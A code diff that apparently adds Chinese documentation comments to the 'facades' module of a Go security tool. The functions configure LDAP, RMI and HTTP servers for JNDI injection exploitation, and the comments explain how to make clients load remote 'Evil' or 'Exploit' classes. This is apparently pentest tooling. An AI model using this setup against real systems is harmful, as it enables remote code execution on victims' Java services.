@@ -170,12 +170,39 @@ func SetLdapResponseEntry(token string, data map[string]any, verbose string) Fac
 	}
 }
 
+// javaClassName 设置 facade 服务 LDAP 响应中的 javaClassName 字段
+// 在 yak 中通过 facades.javaClassName 调用
+// 参数:
+//   - name: Java 类名
+//
+// 返回值:
+//   - 一个 facade 服务配置选项
+//
+// Example:
+// ```
+// // 该示例为示意性用法：设置恶意 Java 类名
+// server = facades.NewFacadeServer("0.0.0.0", 8085, facades.javaClassName("EvilObject"))
+// ```
 func SetJavaClassName(name string) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		f.ldapEntry["javaClassName"] = name
 	}
 }
 
+// ldapResourceAddr 注册一个 LDAP 资源，引导客户端从指定 codebase 加载 Java 工厂类(JNDI 注入利用)
+// 在 yak 中通过 facades.ldapResourceAddr 调用
+// 参数:
+//   - name: 资源/类名
+//   - addr: 远程 codebase 地址
+//
+// 返回值:
+//   - 一个 facade 服务配置选项
+//
+// Example:
+// ```
+// // 该示例为示意性用法：配置 LDAP 资源指向远程 codebase
+// server = facades.NewFacadeServer("0.0.0.0", 1389, facades.ldapResourceAddr("Exploit", "http://127.0.0.1:8000/"))
+// ```
 func SetLdapResourceAddr(name string, addr string) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		f.ldapResourceAddrs.SetResource(name, map[string]any{
@@ -187,18 +214,57 @@ func SetLdapResourceAddr(name string, addr string) FacadeServerConfig {
 	}
 }
 
+// javaCodeBase 设置 facade 服务 LDAP 响应中的 javaCodeBase 字段(远程类加载地址)
+// 在 yak 中通过 facades.javaCodeBase 调用
+// 参数:
+//   - codeBase: 远程 codebase 地址
+//
+// 返回值:
+//   - 一个 facade 服务配置选项
+//
+// Example:
+// ```
+// // 该示例为示意性用法：设置远程类加载地址
+// server = facades.NewFacadeServer("0.0.0.0", 1389, facades.javaCodeBase("http://127.0.0.1:8000/"))
+// ```
 func SetJavaCodeBase(codeBase string) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		f.ldapEntry["javaCodeBase"] = codeBase
 	}
 }
 
+// objectClass 设置 facade 服务 LDAP 响应中的 objectClass 字段
+// 在 yak 中通过 facades.objectClass 调用
+// 参数:
+//   - obj: objectClass 值，如 javaNamingReference
+//
+// 返回值:
+//   - 一个 facade 服务配置选项
+//
+// Example:
+// ```
+// // 该示例为示意性用法：设置 objectClass
+// server = facades.NewFacadeServer("0.0.0.0", 1389, facades.objectClass("javaNamingReference"))
+// ```
 func SetObjectClass(obj string) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		f.ldapEntry["objectClass"] = obj
 	}
 }
 
+// javaFactory 设置 facade 服务 LDAP 响应中的 javaFactory 字段(工厂类名)
+// 在 yak 中通过 facades.javaFactory 调用
+// 参数:
+//   - factory: 工厂类名
+//
+// 返回值:
+//   - 一个 facade 服务配置选项
+//
+// Example:
+// ```
+// // 该示例为示意性用法：设置 javaFactory
+// server = facades.NewFacadeServer("0.0.0.0", 1389, facades.javaFactory("EvilFactory"))
+// ```
 func SetjavaFactory(factory string) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		f.ldapEntry["javaFactory"] = factory
@@ -223,6 +289,20 @@ func SetRmiResource(name string, resource []byte, verbose string) FacadeServerCo
 	}
 }
 
+// rmiResourceAddr 注册一个 RMI 资源，引导 RMI 客户端从指定 codebase 加载远程类(RMI/JNDI 注入利用)
+// 在 yak 中通过 facades.rmiResourceAddr(或别名 facades.evilClassResource) 调用
+// 参数:
+//   - name: 资源/类名
+//   - rmiResourceAddr: 远程 codebase 地址
+//
+// 返回值:
+//   - 一个 facade 服务配置选项
+//
+// Example:
+// ```
+// // 该示例为示意性用法：配置 RMI 资源指向远程 codebase
+// server = facades.NewFacadeServer("0.0.0.0", 1099, facades.rmiResourceAddr("Exploit", "http://127.0.0.1:8000/"))
+// ```
 func SetRmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		objIns, err := LoadReferenceResourceForRmi()
@@ -248,6 +328,20 @@ func SetRmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig 
 	}
 }
 
+// httpResource 在 facade 服务上注册一个 HTTP 资源(路径 /name 返回指定内容)，常用于托管恶意 class 文件
+// 在 yak 中通过 facades.httpResource 调用
+// 参数:
+//   - name: 资源路径名(实际访问路径为 /name)
+//   - resource: 资源内容字节数组
+//
+// 返回值:
+//   - 一个 facade 服务配置选项
+//
+// Example:
+// ```
+// // 该示例为示意性用法：托管一个 HTTP 资源
+// server = facades.NewFacadeServer("0.0.0.0", 8000, facades.httpResource("Exploit.class", []byte("...")))
+// ```
 func SetHttpResource(name string, resource []byte) FacadeServerConfig {
 	return func(f *FacadeServer) {
 		f.SetHttpRawResource("/"+name, resource)
@@ -294,6 +388,21 @@ func (F *FacadeServer) ConvertRemoteAddr(addr string) string {
 	return addr
 }
 
+// Serve 在指定地址和端口启动一个 facade 综合服务(同时支持 LDAP/RMI/HTTP 等)并阻塞运行
+// 在 yak 中通过 facades.Serve 调用，常用于 JNDI 注入等漏洞的回连利用
+// 参数:
+//   - host: 监听地址
+//   - port: 监听端口
+//   - configs: 可选配置项，如 facades.ldapResourceAddr、facades.httpResource 等
+//
+// 返回值:
+//   - 错误信息，启动失败时非 nil
+//
+// Example:
+// ```
+// // 该示例为示意性用法：启动 facade 服务(会阻塞)
+// err = facades.Serve("0.0.0.0", 1389, facades.ldapResourceAddr("Exploit", "http://127.0.0.1:8000/"))
+// ```
 func Serve(host string, port int, configs ...FacadeServerConfig) error {
 	server := NewFacadeServer(host, port, configs...)
 	err := server.ServeWithContext(context.Background())
@@ -303,6 +412,22 @@ func Serve(host string, port int, configs ...FacadeServerConfig) error {
 	return nil
 }
 
+// NewFacadeServer 创建一个 facade 综合服务对象(同时支持 LDAP/RMI/HTTP 等)，可后续调用其方法启动
+// 在 yak 中通过 facades.NewFacadeServer 调用
+// 参数:
+//   - host: 监听地址
+//   - port: 监听端口
+//   - configs: 可选配置项，如 facades.ldapResourceAddr、facades.httpResource 等
+//
+// 返回值:
+//   - facade 服务对象
+//
+// Example:
+// ```
+// // 该示例为示意性用法：创建 facade 服务对象
+// server = facades.NewFacadeServer("0.0.0.0", 1389, facades.javaClassName("EvilObject"))
+// println(server != nil)
+// ```
 func NewFacadeServer(host string, port int, configs ...FacadeServerConfig) *FacadeServer {
 	facadeServer := &FacadeServer{
 		Host:              host,
